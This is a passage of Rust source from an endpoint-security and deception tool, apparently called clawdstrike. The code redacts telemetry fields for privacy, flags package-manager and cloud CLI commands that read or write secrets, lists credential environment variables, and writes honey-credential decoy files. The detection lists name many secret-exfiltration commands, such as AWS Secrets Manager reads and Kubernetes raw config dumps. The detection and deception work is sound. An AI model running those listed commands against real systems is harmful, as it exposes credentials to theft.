                projections,
                "event.packageScript.package",
                package.as_deref(),
                privacy_mode,
                "package names may reveal private dependencies",
            );
            push_local(
                projections,
                "event.packageScript.script",
                script,
                privacy_mode,
                "package scripts are raw execution artifacts",
            );
            push_optional_hash(
                projections,
                "event.packageScript.workingDirectory",
                working_directory.as_deref(),
                privacy_mode,
                "working directories may include local usernames or repository names",
            );
        }
        EndpointEvent::DylibLoad {
            path,
            target_image,
            mechanism,
        } => {
            push_hash(
                projections,
                "event.dylibLoad.path",
                path,
                privacy_mode,
                "library paths may include local usernames or project names",
            );
            push_optional_hash(
                projections,
                "event.dylibLoad.targetImage",
                target_image.as_deref(),
                privacy_mode,
                "target image paths may include local usernames or project names",
            );
            push_optional_metadata(
                projections,
                "event.dylibLoad.mechanism",
                mechanism.clone(),
                privacy_mode,
                "load mechanism is a normalized event feature",
            );
        }
        EndpointEvent::LaunchPersistence {
            path,
            label,
            operation,
        } => {
            push_hash(
                projections,
                "event.launchPersistence.path",
                path,
                privacy_mode,
                "persistence paths may include local usernames or app-specific names",
            );
            push_optional_hash(
                projections,
                "event.launchPersistence.label",
                label.as_deref(),
                privacy_mode,
                "launch labels may reveal private tooling",
            );
            push_metadata(
                projections,
                "event.launchPersistence.operation",
                format!("{operation:?}"),
                privacy_mode,
                "persistence operation is a normalized event feature",
            );
        }
        EndpointEvent::BrowserExtensionInstall {
            browser,
            extension_id,
            path,
            source,
        } => {
            push_metadata(
                projections,
                "event.browserExtensionInstall.browser",
                browser,
                privacy_mode,
                "browser family is a normalized event feature",
            );
            push_optional_hash(
                projections,
                "event.browserExtensionInstall.extensionId",
                extension_id.as_deref(),
                privacy_mode,
                "extension IDs are correlated by hash by default",
            );
            push_hash(
                projections,
                "event.browserExtensionInstall.path",
                path,
                privacy_mode,
                "extension paths may include local usernames",
            );
            push_optional_hash(
                projections,
                "event.browserExtensionInstall.source",
                source.as_deref(),
                privacy_mode,
                "extension source may include internal locations",
            );
        }
        EndpointEvent::BrowserDownload {
            browser,
            path,
            source_url,
            content_hash,
            byte_count,
        } => {
            push_metadata(
                projections,
                "event.browserDownload.browser",
                browser,
                privacy_mode,
                "browser family is a normalized event feature",
            );
            push_hash(
                projections,
                "event.browserDownload.path",
                path,
                privacy_mode,
                "download paths may include local usernames or document names",
            );
            push_optional_hash(
                projections,
                "event.browserDownload.sourceUrl",
                source_url.as_deref(),
                privacy_mode,
                "download URLs may contain internal hosts or query strings",
            );
            push_optional_metadata(
                projections,
                "event.browserDownload.contentHash",
                content_hash.clone(),
                privacy_mode,
                "download content hashes are privacy-safe artifact proof",
            );
            push_optional_metadata(
                projections,
                "event.browserDownload.byteCount",
                byte_count.map(|value| value.to_string()),
                privacy_mode,
                "download byte count is a bounded artifact feature",
            );
        }
        EndpointEvent::CredentialAccess { kind, path, name } => {
            push_metadata(
                projections,
                "event.credentialAccess.kind",
                kind.as_str(),
                privacy_mode,
                "credential kind is a normalized event feature",
            );
            push_optional_hash(
                projections,
                "event.credentialAccess.path",
                path.as_deref(),
                privacy_mode,
                "credential paths may include local usernames or secret store names",
            );
            push_optional_hash(
                projections,
                "event.credentialAccess.name",
                name.as_deref(),
                privacy_mode,
                "credential names are correlated by hash by default",
            );
        }
        EndpointEvent::ToolCall {
            tool_name,
            parameters,
        } => {
            push_metadata(
                projections,
                "event.toolCall.toolName",
                tool_name,
                privacy_mode,
                "tool names are normalized agent features",
            );
            push_local(
                projections,
                "event.toolCall.parameters",
                serde_json::to_string(parameters).unwrap_or_default(),
                privacy_mode,
                "tool parameters may contain prompts, file contents, or secrets",
            );
        }
        EndpointEvent::PolicyDecision {
            action,
            target,
            decision,
            guard,
            severity,
        } => {
            push_metadata(
                projections,
                "event.policyDecision.action",
                action.as_str(),
                privacy_mode,
                "policy action is a normalized decision feature",
            );
            push_optional_hash(
                projections,
                "event.policyDecision.target",
                target.as_deref(),
                privacy_mode,
                "policy targets may include paths, hosts, or credential names",
            );
            push_metadata(
                projections,
                "event.policyDecision.decision",
                decision,
                privacy_mode,
                "policy decision is a normalized decision feature",
            );
            push_optional_metadata(
                projections,
                "event.policyDecision.guard",
                guard.clone(),
                privacy_mode,
                "guard identifier is a normalized decision feature",
            );
            push_optional_metadata(
                projections,
                "event.policyDecision.severity",
                severity.clone(),
                privacy_mode,
                "severity is a normalized decision feature",
            );
        }
        EndpointEvent::Other { category, fields } => {
            push_metadata(
                projections,
                "event.other.category",
                category,
                privacy_mode,
                "custom event category is a normalized feature",
            );
            if !fields.is_empty() {
                push_local(
                    projections,
                    "event.other.fields",
                    serde_json::to_string(fields).unwrap_or_default(),
                    privacy_mode,
                    "custom event fields may contain arbitrary raw artifacts",
                );
            }
        }
    }
}

fn count_projection_class(
    observations: &[EndpointTelemetryObservationProjection],
    redaction_class: EndpointEvidenceRedactionClass,
) -> usize {
    observations
        .iter()
        .flat_map(|observation| observation.projections.iter())
        .filter(|projection| projection.redaction_class == redaction_class)
        .count()
}

fn push_optional_metadata(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: Option<String>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    if let Some(value) = value.filter(|value| !value.trim().is_empty()) {
        push_metadata(projections, field_path, value, privacy_mode, reason);
    }
}

fn push_metadata(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: impl AsRef<str>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    let value = value.as_ref();
    let redaction_class = if *privacy_mode == EndpointTelemetryPrivacyMode::LocalOnly {
        EndpointEvidenceRedactionClass::LocalOnly
    } else {
        EndpointEvidenceRedactionClass::MetadataOnly
    };
    projections.push(EndpointTelemetryFieldProjection {
        field_path: field_path.into(),
        redaction_class,
        value_hash: Some(sha256(value.as_bytes()).to_hex_prefixed()),
        feature_value: (!matches!(privacy_mode, EndpointTelemetryPrivacyMode::LocalOnly))
            .then(|| value.to_string()),
        raw_value: None,
        reason: reason.into(),
    });
}

fn push_optional_hash(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: Option<&str>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    if let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) {
        push_hash(projections, field_path, value, privacy_mode, reason);
    }
}

fn push_hash(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: impl AsRef<str>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    let value = value.as_ref();
    let redaction_class = if *privacy_mode == EndpointTelemetryPrivacyMode::LocalOnly {
        EndpointEvidenceRedactionClass::LocalOnly
    } else {
        EndpointEvidenceRedactionClass::HashOnly
    };
    projections.push(EndpointTelemetryFieldProjection {
        field_path: field_path.into(),
        redaction_class,
        value_hash: Some(sha256(value.as_bytes()).to_hex_prefixed()),
        feature_value: (!matches!(privacy_mode, EndpointTelemetryPrivacyMode::LocalOnly))
            .then(|| privacy_feature(value)),
        raw_value: None,
        reason: reason.into(),
    });
}

fn push_optional_local(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: Option<&str>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    if let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) {
        push_local(projections, field_path, value, privacy_mode, reason);
    }
}

fn push_local(
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
    field_path: impl Into<String>,
    value: impl AsRef<str>,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    reason: impl Into<String>,
) {
    let value = value.as_ref();
    let raw_permitted = privacy_mode.permits_raw_artifacts();
    projections.push(EndpointTelemetryFieldProjection {
        field_path: field_path.into(),
        redaction_class: if raw_permitted {
            EndpointEvidenceRedactionClass::RawArtifactPermitted
        } else {
            EndpointEvidenceRedactionClass::LocalOnly
        },
        value_hash: Some(sha256(value.as_bytes()).to_hex_prefixed()),
        feature_value: (!matches!(privacy_mode, EndpointTelemetryPrivacyMode::LocalOnly))
            .then(|| privacy_feature(value)),
        raw_value: raw_permitted.then(|| value.to_string()),
        reason: reason.into(),
    });
}

fn privacy_feature(value: &str) -> String {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return "empty".to_string();
    }
    if let Some((scheme, _)) = trimmed.split_once("://") {
        return format!("url_scheme:{scheme}");
    }
    if trimmed.contains('/') || trimmed.contains('\\') {
        let normalized = normalize_path_string(trimmed);
        let extension = Path::new(&normalized)
            .extension()
            .and_then(|extension| extension.to_str())
            .filter(|extension| !extension.is_empty());
        return extension
            .map(|extension| format!("path_extension:{extension}"))
            .unwrap_or_else(|| "path".to_string());
    }
    format!("len:{}", trimmed.len())
}

fn command_looks_like_package_manager(image: &str, args: &[String]) -> bool {
    let image = image.to_ascii_lowercase();
    let args = args.join(" ").to_ascii_lowercase();
    [
        "npm", "pnpm", "yarn", "pip", "pip3", "cargo", "brew", "go", "gem", "bundle",
    ]
    .iter()
    .any(|name| image.ends_with(name) || image.contains(&format!("/{name}")))
        || args.contains(" npm ")
        || args.contains(" pip ")
        || args.contains(" cargo ")
}

pub(crate) fn package_registry_cli_name<'a>(
    image: &'a str,
    args: &'a [String],
) -> Option<&'static str> {
    let image = image.to_ascii_lowercase();
    let first_arg = args
        .first()
        .map(|value| value.to_ascii_lowercase())
        .unwrap_or_default();
    [("npm", "npm"), ("pnpm", "pnpm"), ("yarn", "yarn")]
        .into_iter()
        .find_map(|(binary, manager)| {
            let image_matches = image == binary
                || image.ends_with(&format!("/{binary}"))
                || image.contains(&format!("/{binary}-"));
            let arg_matches = first_arg == binary || first_arg.ends_with(&format!("/{binary}"));
            (image_matches || arg_matches).then_some(manager)
        })
}

fn suspicious_package_registry_cli_reason(args: &[String]) -> Option<&'static str> {
    let args = args.join(" ").to_ascii_lowercase();
    [
        ("token list", "lists npm authentication tokens"),
        ("token create", "creates an npm authentication token"),
        ("token revoke", "revokes an npm authentication token"),
        ("token delete", "deletes an npm authentication token"),
        (
            "config get",
            "reads package manager registry authentication configuration",
        ),
        (
            "config set",
            "writes package manager registry authentication configuration",
        ),
        (
            "config delete",
            "deletes package manager registry authentication configuration",
        ),
    ]
    .into_iter()
    .find_map(|(needle, reason)| {
        if args.contains(needle)
            && (needle.starts_with("token ") || package_registry_auth_config_reference(&args))
        {
            Some(reason)
        } else {
            None
        }
    })
}

fn package_registry_auth_config_reference(args: &str) -> bool {
    args.contains("_authtoken")
        || args.contains("node_auth_token")
        || args.contains("npm_token")
        || args.contains("npm_config_")
}

fn package_registry_credential_env_keys(env: &BTreeMap<String, String>) -> Vec<String> {
    env.keys()
        .filter(|key| {
            matches!(
                key.to_ascii_uppercase().as_str(),
                "NODE_AUTH_TOKEN"
                    | "NPM_TOKEN"
                    | "NPM_CONFIG_TOKEN"
                    | "NPM_CONFIG__AUTH"
                    | "NPM_CONFIG__AUTHTOKEN"
                    | "YARN_NPM_AUTH_TOKEN"
            )
        })
        .cloned()
        .collect()
}

pub(crate) fn cloud_cli_name<'a>(image: &'a str, args: &'a [String]) -> Option<&'static str> {
    let image = image.to_ascii_lowercase();
    let first_arg = args
        .first()
        .map(|value| value.to_ascii_lowercase())
        .unwrap_or_default();
    [
        ("aws", "aws"),
        ("gcloud", "gcloud"),
        ("az", "az"),
        ("doctl", "doctl"),
        ("fly", "fly"),
        ("flyctl", "fly"),
        ("gh", "gh"),
        ("vercel", "vercel"),
        ("netlify", "netlify"),
        ("wrangler", "wrangler"),
        ("op", "op"),
        ("vault", "vault"),
        ("doppler", "doppler"),
        ("heroku", "heroku"),
        ("supabase", "supabase"),
        ("firebase", "firebase"),
        ("railway", "railway"),
        ("stripe", "stripe"),
        ("sentry-cli", "sentry"),
        ("snyk", "snyk"),
        ("bw", "bitwarden"),
        ("kubectl", "kubectl"),
        ("pulumi", "pulumi"),
        ("circleci", "circleci"),
        ("glab", "glab"),
        ("buildkite-agent", "buildkite"),
        ("bk", "buildkite"),
        ("drone", "drone"),
        ("sem", "semaphore"),
        ("semaphore", "semaphore"),
        ("appveyor", "appveyor"),
        ("woodpecker", "woodpecker"),
        ("codefresh", "codefresh"),
        ("terraform", "terraform"),
        ("terragrunt", "terragrunt"),
        ("tofu", "opentofu"),
    ]
    .into_iter()
    .find_map(|(binary, cli_name)| {
        let image_matches = image == binary
            || image.ends_with(&format!("/{binary}"))
            || image.contains(&format!("/{binary}-"));
        let arg_matches = first_arg == binary || first_arg.ends_with(&format!("/{binary}"));
        (image_matches || arg_matches).then_some(cli_name)
    })
}

fn suspicious_cloud_cli_reason(args: &[String]) -> Option<&'static str> {
    let args = args.join(" ").to_ascii_lowercase();
    [
        (
            "secretsmanager get-secret-value",
            "reads an AWS Secrets Manager secret value",
        ),
        ("ssm get-parameter", "reads an AWS SSM parameter value"),
        ("ssm get-parameters", "reads AWS SSM parameter values"),
        ("iam create-access-key", "creates a new AWS IAM access key"),
        (
            "iam put-user-policy",
            "modifies an AWS IAM inline user policy",
        ),
        (
            "iam attach-user-policy",
            "attaches an AWS IAM policy to a user",
        ),
        (
            "ecr get-login-password",
            "exports an AWS ECR registry login password",
        ),
        (
            "auth print-access-token",
            "prints a cloud OAuth access token",
        ),
        (
            "secrets versions access",
            "reads a GCP Secret Manager secret version",
        ),
        (
            "iam service-accounts keys create",
            "creates a GCP service account key",
        ),
        ("keyvault secret show", "reads an Azure Key Vault secret"),
        (
            "keyvault secret download",
            "downloads an Azure Key Vault secret",
        ),
        (
            "account get-access-token",
            "prints an Azure account access token",
        ),
        (
            "ad app credential reset",
            "resets Azure application credentials",
        ),
        (
            "secret set",
            "writes a GitHub repository or organization secret",
        ),
        (
            "versions secret put",
            "writes a Cloudflare Worker version secret",
        ),
        (
            "versions secret bulk",
            "bulk imports Cloudflare Worker version secrets",
        ),
        ("secret put", "writes a Cloudflare Worker or Pages secret"),
        ("secret bulk", "bulk imports Cloudflare Worker secrets"),
        (
            "registry docker-config",
            "prints DigitalOcean registry Docker credentials",
        ),
        (
            "registry login",
            "writes DigitalOcean registry credentials locally",
        ),
        (
            "kubernetes cluster kubeconfig save",
            "writes DigitalOcean Kubernetes access credentials locally",
        ),
        ("secrets set", "writes a Fly.io app secret"),
        ("secrets import", "imports Fly.io app secrets"),
        ("secrets unset", "removes a Fly.io app secret"),
        ("secrets list", "lists Fly.io app secrets"),
        ("tokens create", "creates a Fly.io API token"),
        ("tokens revoke", "revokes a Fly.io API token"),
        ("secret get", "reads a cloud or CI platform secret"),
        ("secret list", "lists cloud CLI secrets"),
        ("secret create", "creates a cloud or CI platform secret"),
        ("secret update", "updates a cloud or CI platform secret"),
        ("secret delete", "deletes a cloud CLI secret"),
        ("auth token", "prints a GitHub CLI authentication token"),
        (
            "variable set",
            "writes a CI/CD or developer-platform variable",
        ),
        (
            "variable update",
            "updates a CI/CD or developer-platform variable",
        ),
        (
            "variable delete",
            "deletes a CI/CD or developer-platform variable",
        ),
        (
            "variable get",
            "reads a CI/CD or developer-platform variable",
        ),
        (
            "variable list",
            "lists CI/CD or developer-platform variables",
        ),
        (
            "variable export",
            "exports CI/CD or developer-platform variables",
        ),
        ("env pull", "pulls Vercel environment variables locally"),
        ("env add", "writes a Vercel project environment variable"),
        ("env rm", "removes a Vercel project environment variable"),
        (
            "env remove",
            "removes a Vercel project environment variable",
        ),
        ("env ls", "lists Vercel project environment variables"),
        ("env:get", "retrieves a Netlify environment variable"),
        ("env:list", "lists Netlify environment variables"),
        ("env:set", "writes a Netlify environment variable"),
        ("env:import", "imports Netlify environment variables"),
        ("env:unset", "deletes a Netlify environment variable"),
        ("item get", "reads a 1Password item"),
        ("get item", "reads a password-manager item"),
        ("document get", "reads a 1Password document"),
        ("op://", "reads a 1Password secret reference"),
        ("kv get", "reads a Vault KV secret"),
        ("read secret/", "reads a Vault secret path"),
        ("token create", "creates an access token"),
        ("secrets download", "downloads application secrets"),
        ("configs tokens create", "creates a Doppler config token"),
        ("config:get", "reads a platform environment variable"),
        ("config:set", "writes a platform environment variable"),
        ("secrets pull", "downloads project secrets"),
        (
            "functions:secrets:access",
            "reads a Firebase Functions secret",
        ),
        (
            "functions:secrets:set",
            "writes a Firebase Functions secret",
        ),
        ("variables", "reads or writes Railway service variables"),
        (
            "login --auth-token",
            "logs into a developer platform with an auth token",
        ),
        (
            "auth --auth-token",
            "authenticates a developer security tool with an auth token",
        ),
        ("get secret", "reads a Kubernetes Secret object"),
        ("describe secret", "describes a Kubernetes Secret object"),
        (
            "config view --raw",
            "prints raw Kubernetes credential configuration",
        ),
        (
            "--show-secrets",
            "prints secret values from developer platform configuration",
        ),
        ("context store-secret", "writes a CircleCI context secret"),
        ("context remove-secret", "removes a CircleCI context secret"),
        ("runner token create", "creates a CircleCI runner token"),
        ("runner token list", "lists CircleCI runner tokens"),
        ("secret add", "writes a CI platform secret"),
        ("secret rm", "removes a CI platform secret"),
        ("secret remove", "removes a CI platform secret"),
        ("auth create-token", "creates a CI platform API token"),
        ("encrypt --secret", "encrypts CI platform secret material"),
        (
            "context create",
            "creates CI platform context or credential material",
        ),
        (
            "login --api-key",
            "authenticates Stripe CLI with an inline API key",
        ),
        (
            "listen --print-secret",
            "prints a Stripe webhook signing secret",
        ),
        ("output -json", "prints Terraform output values"),
        ("output -raw", "prints a Terraform output value"),
        ("state pull", "exports Terraform state"),
        ("state show", "prints Terraform state for a resource"),
        ("show -json", "prints Terraform plan or state values"),
    ]
    .into_iter()
    .find_map(|(needle, reason)| args.contains(needle).then_some(reason))
}

fn cloud_credential_env_keys(env: &BTreeMap<String, String>) -> Vec<String> {
    env.keys()
        .filter(|key| {
            let upper = key.to_ascii_uppercase();
            upper.starts_with("TF_TOKEN_")
                || upper.starts_with("TERRAFORM_TOKEN")
                || matches!(
                    upper.as_str(),
                    "AWS_ACCESS_KEY_ID"
                        | "AWS_SECRET_ACCESS_KEY"
                        | "AWS_SESSION_TOKEN"
                        | "AWS_PROFILE"
                        | "GOOGLE_APPLICATION_CREDENTIALS"
                        | "CLOUDSDK_AUTH_ACCESS_TOKEN"
                        | "AZURE_CLIENT_ID"
                        | "AZURE_CLIENT_SECRET"
                        | "AZURE_TENANT_ID"
                        | "ARM_CLIENT_ID"
                        | "ARM_CLIENT_SECRET"
                        | "ARM_TENANT_ID"
                        | "GITHUB_TOKEN"
                        | "GH_TOKEN"
                        | "VERCEL_TOKEN"
                        | "NETLIFY_AUTH_TOKEN"
                        | "CLOUDFLARE_API_TOKEN"
                        | "CLOUDFLARE_API_KEY"
                        | "CLOUDFLARE_ACCESS_CLIENT_ID"
                        | "CLOUDFLARE_ACCESS_CLIENT_SECRET"
                        | "WRANGLER_R2_SQL_AUTH_TOKEN"
                        | "CF_API_TOKEN"
                        | "CF_API_KEY"
                        | "DIGITALOCEAN_ACCESS_TOKEN"
                        | "DO_API_TOKEN"
                        | "FLY_API_TOKEN"
                        | "FLY_ACCESS_TOKEN"
                        | "OP_SERVICE_ACCOUNT_TOKEN"
                        | "OP_CONNECT_TOKEN"
                        | "VAULT_TOKEN"
                        | "DOPPLER_TOKEN"
                        | "DOPPLER_SERVICE_TOKEN"
                        | "HEROKU_API_KEY"
                        | "SUPABASE_ACCESS_TOKEN"
                        | "SUPABASE_SERVICE_ROLE_KEY"
                        | "FIREBASE_TOKEN"
                        | "RAILWAY_TOKEN"
                        | "STRIPE_API_KEY"
                        | "STRIPE_WEBHOOK_SECRET"
                        | "SENTRY_AUTH_TOKEN"
                        | "SNYK_TOKEN"
                        | "BW_SESSION"
                        | "KUBECONFIG"
                        | "PULUMI_ACCESS_TOKEN"
                        | "PULUMI_CONFIG_PASSPHRASE"
                        | "CIRCLECI_CLI_TOKEN"
                        | "CIRCLE_TOKEN"
                        | "GITLAB_TOKEN"
                        | "GITLAB_ACCESS_TOKEN"
                        | "CI_JOB_TOKEN"
                        | "BUILDKITE_AGENT_ACCESS_TOKEN"
                        | "BUILDKITE_API_TOKEN"
                        | "DRONE_TOKEN"
                        | "DRONE_NETRC_PASSWORD"
                        | "SEMAPHORE_API_TOKEN"
                        | "SEMAPHORE_OIDC_TOKEN"
                        | "APPVEYOR_API_TOKEN"
                        | "APPVEYOR_TOKEN"
                        | "WOODPECKER_TOKEN"
                        | "CODEFRESH_API_KEY"
                        | "TFE_TOKEN"
                )
        })
        .cloned()
        .collect()
}

fn observed_path(observation: &EndpointObservation) -> Option<&str> {
    match &observation.event {
        EndpointEvent::FileAccess { path, .. }
        | EndpointEvent::DylibLoad { path, .. }
        | EndpointEvent::LaunchPersistence { path, .. }
        | EndpointEvent::BrowserExtensionInstall { path, .. }
        | EndpointEvent::BrowserDownload { path, .. } => Some(path),
        EndpointEvent::CredentialAccess { path, .. } => path.as_deref(),
        _ => None,
    }
}

fn honey_artifact_match_evidence(
    artifact: &HoneyArtifact,
    observation: &EndpointObservation,
) -> Option<Vec<DetectionEvidence>> {
    let mut evidence = vec![
        ev("artifactId", &artifact.artifact_id),
        ev("artifactKind", artifact.kind.as_str()),
        ev("artifactPath", artifact.relative_path.display().to_string()),
    ];

    if let Some(accessed_path) = observed_path(observation) {
        if artifact.matches_path(accessed_path) {
            evidence.push(ev("matchType", "path"));
            evidence.push(ev("observedPath", accessed_path));
            return Some(evidence);
        }
    }

    if let EndpointEvent::NetworkFlow { host, url, .. } = &observation.event {
        if artifact.matches_network_destination(host, url.as_deref()) {
            evidence.push(ev("matchType", "network_destination"));
            evidence.push(ev("observedHost", host));
            if let Some(url) = url {
                evidence.push(ev("observedUrl", url));
            }
            if let Some(honey_host) = artifact.internal_hostname() {
                evidence.push(ev("honeyHost", honey_host));
            }
            return Some(evidence);
        }
    }

    if let EndpointEvent::DnsLookup { query, answers, .. } = &observation.event {
        if artifact.matches_network_destination(query, None)
            || answers
                .iter()
                .any(|answer| artifact.matches_network_destination(answer, None))
        {
            evidence.push(ev("matchType", "dns_query"));
            evidence.push(ev("observedQuery", query));
            if !answers.is_empty() {
                evidence.push(ev("observedAnswers", answers.join(",")));
            }
            if let Some(honey_host) = artifact.internal_hostname() {
                evidence.push(ev("honeyHost", honey_host));
            }
            return Some(evidence);
        }
    }

    if let EndpointEvent::CredentialAccess { kind, name, .. } = &observation.event {
        if *kind == CredentialKind::BrowserCookie
            && artifact.matches_browser_cookie_access(name.as_deref())
        {
            evidence.push(ev("matchType", "browser_cookie"));
            if let Some(name) = name {
                evidence.push(ev("credentialName", name));
            }
            return Some(evidence);
        }
    }

    if observation_contains_marker(observation, &artifact.marker) {
        evidence.push(ev("matchType", "marker"));
        return Some(evidence);
    }

    None
}

fn observation_contains_marker(observation: &EndpointObservation, marker: &str) -> bool {
    if marker.is_empty() {
        return false;
    }
    match &observation.event {
        EndpointEvent::FileAccess {
            content_preview: Some(content),
            ..
        } if content.contains(marker) => true,
        _ => {
            serialized_contains_marker(&observation.event, marker)
                || serialized_contains_marker(&observation.metadata, marker)
        }
    }
}

fn serialized_contains_marker<T: Serialize>(value: &T, marker: &str) -> bool {
    serde_json::to_string(value)
        .map(|value| value.contains(marker))
        .unwrap_or(false)
}

fn honey_artifact(
    endpoint_id: &str,
    kind: HoneyArtifactKind,
    relative_path: &str,
) -> HoneyArtifact {
    let artifact_id = stable_id("honey", [endpoint_id, kind.as_str(), relative_path]);
    let marker = format!("clawdstrike-honey-{artifact_id}");
    let contents = honey_contents(&kind, endpoint_id, &marker);
    HoneyArtifact {
        artifact_id,
        kind,
        relative_path: PathBuf::from(relative_path),
        marker,
        contents,
        permissions_octal: 0o600,
        tags: vec!["deception".to_string(), "endpoint".to_string()],
    }
}

fn honey_contents(kind: &HoneyArtifactKind, endpoint_id: &str, marker: &str) -> String {
    match kind {
        HoneyArtifactKind::SshPrivateKey => format!(
            "# honey ssh key for endpoint {endpoint_id}\n# marker: {marker}\n-----BEGIN OPENSSH PRIVATE KEY-----\n{marker}\n-----END OPENSSH PRIVATE KEY-----\n"
        ),
        HoneyArtifactKind::ApiTokenFile => {
            format!("CLAWDSTRIKE_PROD_API_TOKEN=cs_live_{marker}\n")
        }
        HoneyArtifactKind::CloudCredentials => format!(
            "[prod]\naws_access_key_id = AKIA{marker}\naws_secret_access_key = {marker}\naws_session_token = {marker}\n"
        ),
        HoneyArtifactKind::PackageRegistryToken => {
            format!("//registry.npmjs.org/:_authToken=npm_{marker}\n")
        }
        HoneyArtifactKind::BrowserCookieJar => format!(
            "{{\"cookies\":[{{\"domain\":\"intranet.invalid\",\"name\":\"session\",\"value\":\"{marker}\"}}]}}\n"
        ),
        HoneyArtifactKind::InternalHostname => {
            format!("prod-admin-{endpoint_id}.corp.invalid # {marker}\n")
        }
    }
}

fn ensure_safe_relative_path(path: &Path) -> Result<()> {
    if path.is_absolute() {
        return Err(anyhow!(
            "honey artifact path must be relative: {}",
            path.display()
        ));
    }
    for component in path.components() {
        if matches!(
            component,
            Component::ParentDir | Component::RootDir | Component::Prefix(_)
        ) {
            return Err(anyhow!(
                "honey artifact path contains unsafe component: {}",
                path.display()
            ));
        }
    }
    Ok(())
}

fn create_new_honey_file(path: &Path, artifact: &HoneyArtifact) -> std::io::Result<()> {
    let mut file = OpenOptions::new().write(true).create_new(true).open(path)?;
    file.write_all(artifact.contents.as_bytes())?;
    set_file_permissions(path, artifact.permissions_octal)
}

#[cfg(unix)]
fn set_file_permissions(path: &Path, permissions_octal: u32) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;

    fs::set_permissions(path, fs::Permissions::from_mode(permissions_octal))
}

#[cfg(not(unix))]
fn set_file_permissions(_path: &Path, _permissions_octal: u32) -> std::io::Result<()> {
    Ok(())
}

fn normalize_path_string(path: &str) -> String {
    let replaced = path.replace('\\', "/");
    let is_absolute = replaced.starts_with('/');
    let normalized = replaced
        .split('/')
        .filter(|part| !part.is_empty() && *part != ".")
        .collect::<Vec<_>>()
        .join("/");

    if is_absolute {
        format!("/{normalized}")
    } else {
        normalized
    }
}

fn normalize_hostname(host: &str) -> String {
    host.trim()
        .trim_matches(['[', ']'])
        .trim_end_matches('.')
        .to_ascii_lowercase()
}

fn hostname_from_url_like(url: &str) -> Option<String> {
    let trimmed = url.trim();
    if trimmed.is_empty() {
        return None;
    }
    let without_scheme = trimmed
        .split_once("://")
        .map(|(_, rest)| rest)
        .unwrap_or(trimmed);
    let authority = without_scheme
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(without_scheme)
        .rsplit('@')
        .next()
        .unwrap_or(without_scheme)
        .trim();
    if authority.is_empty() {
        return None;
    }
    let host = if authority.starts_with('[') {
        let end = authority.find(']')?;
        &authority[..=end]
    } else {
        authority.split(':').next().unwrap_or(authority)
    };
    let normalized = normalize_hostname(host);
    (!normalized.is_empty()).then_some(normalized)
}

fn stable_id<'a>(prefix: &str, parts: impl IntoIterator<Item = &'a str>) -> String {
    let mut hash = FNV_OFFSET;
    for part in parts {
        for byte in part.as_bytes() {
            hash ^= u64::from(*byte);
            hash = hash.wrapping_mul(FNV_PRIME);
        }
        hash ^= 0xff;
        hash = hash.wrapping_mul(FNV_PRIME);
    }
    format!("{prefix}:{hash:016x}")
}

fn evidence_hash_for_value(value: impl AsRef<str>) -> String {
    sha256(value.as_ref().as_bytes()).to_hex_prefixed()
}

pub(crate) fn insert_json<T: Serialize>(
    map: &mut BTreeMap<String, serde_json::Value>,
    key: &str,
    value: T,
) {
    if let Ok(value) = serde_json::to_value(value) {
        if !value.is_null() {
            map.insert(key.to_string(), value);
        }
    }
}

fn telemetry_privacy_report_id_from_values(
    privacy_mode: &str,
    raw_artifact_upload_permitted: bool,
    raw_artifact_approval_id: Option<&str>,
    raw_artifact_approval_reason_hash: Option<&str>,
    count_values: [&str; 7],
) -> String {
    let privacy_mode_hash = sha256(privacy_mode.as_bytes()).to_hex_prefixed();
    let raw_permitted = raw_artifact_upload_permitted.to_string();
    let raw_permitted_hash = sha256(raw_permitted.as_bytes()).to_hex_prefixed();
    let observation_count_hash = sha256(count_values[0].as_bytes()).to_hex_prefixed();
    let field_count_hash = sha256(count_values[1].as_bytes()).to_hex_prefixed();
    let hash_only_count_hash = sha256(count_values[2].as_bytes()).to_hex_prefixed();
    let metadata_only_count_hash = sha256(count_values[3].as_bytes()).to_hex_prefixed();
    let redacted_count_hash = sha256(count_values[4].as_bytes()).to_hex_prefixed();
    let raw_suppressed_count_hash = sha256(count_values[5].as_bytes()).to_hex_prefixed();
    let local_only_count_hash = sha256(count_values[6].as_bytes()).to_hex_prefixed();
    let mut evidence_hashes = vec![
        privacy_mode_hash.as_str(),
        raw_permitted_hash.as_str(),
        observation_count_hash.as_str(),
        field_count_hash.as_str(),
        hash_only_count_hash.as_str(),
        metadata_only_count_hash.as_str(),
        redacted_count_hash.as_str(),
        raw_suppressed_count_hash.as_str(),
        local_only_count_hash.as_str(),
    ];
    let raw_artifact_approval_id_hash =
        raw_artifact_approval_id.map(|value| sha256(value.as_bytes()).to_hex_prefixed());
    let raw_artifact_approval_reason_hash_hash =
        raw_artifact_approval_reason_hash.map(|value| sha256(value.as_bytes()).to_hex_prefixed());
    let empty_hash = sha256(b"").to_hex_prefixed();
    if raw_artifact_upload_permitted {
        evidence_hashes.push(
            raw_artifact_approval_id_hash
                .as_deref()
                .unwrap_or(empty_hash.as_str()),
        );
        evidence_hashes.push(
            raw_artifact_approval_reason_hash_hash
                .as_deref()
                .unwrap_or(empty_hash.as_str()),
        );
    }
    telemetry_privacy_report_id_from_evidence_hashes(evidence_hashes)
}

fn telemetry_privacy_report_id_from_evidence_hashes<'a>(
    evidence_hashes: impl IntoIterator<Item = &'a str>,
) -> String {
